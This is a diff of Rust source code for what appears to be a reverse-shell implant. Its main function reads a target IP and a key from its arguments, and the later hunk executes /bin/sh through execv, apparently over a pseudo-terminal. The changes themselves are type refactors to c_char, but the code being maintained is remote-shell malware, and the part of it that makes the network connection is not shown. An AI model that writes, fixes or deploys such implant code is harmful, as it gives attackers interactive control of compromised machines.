@@ -110,7 +110,7 @@ impl AsRawFd for PtyMaster {
 #[cfg_attr(not(test), no_mangle)]
 pub fn main(
 	argc: i32,
-	argv: *const *const u8,
+	argv: *const *const c_char,
 	envp: *const *const u8,
 ) -> i8 {
 	// Check that we have the args
@@ -121,16 +121,10 @@ pub fn main(
 	// Parse argv
 	let argv_ptrs =
 		unsafe { std::slice::from_raw_parts(argv, argc as usize) };
-	let ip_str = unsafe {
-		CStr::from_ptr(argv_ptrs[1] as *const c_char)
-			.to_str()
-			.unwrap()
-	};
-	let key_str = unsafe {
-		CStr::from_ptr(argv_ptrs[2] as *const c_char)
-			.to_str()
-			.unwrap()
-	};
+	let ip_str =
+		unsafe { CStr::from_ptr(argv_ptrs[1]).to_str().unwrap() };
+	let key_str =
+		unsafe { CStr::from_ptr(argv_ptrs[2]).to_str().unwrap() };
 	// Parse the IP
 	let ipaddr_l: Ipv4Addr =
 		ip_str.parse().expect("Failed to parse IP");
@@ -228,12 +222,12 @@ pub fn main(
 			}
 			//  - setup /bin/sh command
 			let sh = b"/bin/sh\0";
-			let mut argv_ptr = [0 as *const i8; 2];
-			argv_ptr[0] = sh.as_ptr() as *const i8;
+			let mut argv_ptr = [0 as *const c_char; 2];
+			argv_ptr[0] = sh.as_ptr() as *const c_char;
 			//  - exec
 			unsafe {
 				libc::execv(
-					sh.as_ptr() as *const i8,
+					sh.as_ptr() as *const c_char,
 					argv_ptr.as_ptr(),
 				)
 			};
